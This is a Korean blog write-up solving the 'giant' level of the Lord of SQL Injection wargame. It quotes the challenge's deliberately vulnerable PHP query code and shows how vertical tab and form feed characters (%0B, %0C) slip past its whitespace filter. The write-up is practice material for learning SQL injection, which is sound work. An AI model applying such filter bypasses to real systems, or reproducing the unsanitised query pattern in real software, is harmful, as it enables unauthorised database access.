---
title: Lord of SQL Injection Write Up No.14 Giant
date: 2019-08-25 23:19:56
updated:
categories:
  - Write Up
tags:
  - Lord of SQL Injection
  - Infosec
---

## 개요

{% img /image/los-main.png 300 %}

SQL Injection에 대한 지식을 쌓기 위해 [Lord of SQL Injection 사이트](https://los.eagle-jump.org/)의 문제를 풀고 해답을 정리한다.

이 문서에서는 Lord of SQL Injection 14번 giant 문제에 대하여 정리한다.

<!-- more -->

## 문제 분석

### 문제 출제 의도

`\n`, `\r`, `\t`, `(공백)` 을 포함하지 않고 SQL Injection을 하여 공백 효과를 낼 수 있는지 확인한다.

### 필요 배경 지식

#### `(공백)`, `\n`, `\r`, `\t`을 제외한 한 문자 공백문자 대체

1. VT(Vertical Tab)
   ASCII Code 표를 살펴보면 16진수로 `0x0B`는 Vertical Tab에 해당한다.
   이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.
2. FF(Form Feed)
   ASCII Code 표를 살펴보면 16진수로 `0x0C`는 Form Feed에 해당한다.
   이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.

### 소스 코드 분석

giant 문제의 php 소스 코드는 다음과 같다.

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(strlen($_GET[shit])>1) exit("No Hack ~_~");
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe");
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result[1234]) solve("giant");
  highlight_file(__FILE__);
?>
```

#### Filter

```php
  if(strlen($_GET[shit])>1) exit("No Hack ~_~");
  if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe");
```

- GET 방식으로 `shit`를 받고, `shit`의 길이가 `1` 초과이면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.
- 또한, `shit`에 `(공백)`, `\n`, `\r`, `\t` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

#### Query

```php
  $query = "select 1234 from{$_GET[shit]}prob_giant where 1";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result[1234]) solve("giant");
```

- 받은 `shit`이 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.
- 문제 풀이가 성공하는 조건은 '`$result[1234]`에 참이 되는 어떤 값이든 들어 있음'이다. 즉, `$_GET[shit]`에 공백 역할을 하는 문자를 삽입하면 풀린다.

## Solution

1. Vertical Tab 이용

   `%0B`(Vertical Tab)을 GET 방식으로 `shit`의 값으로 전달하면 풀린다.

   ```url
   http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0B
   ```

2. Form Feed 이용

   `%0C`(Form Feed)을 GET 방식으로 `shit`의 값으로 전달하면 풀린다.

   ```url
   http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0C
   ```
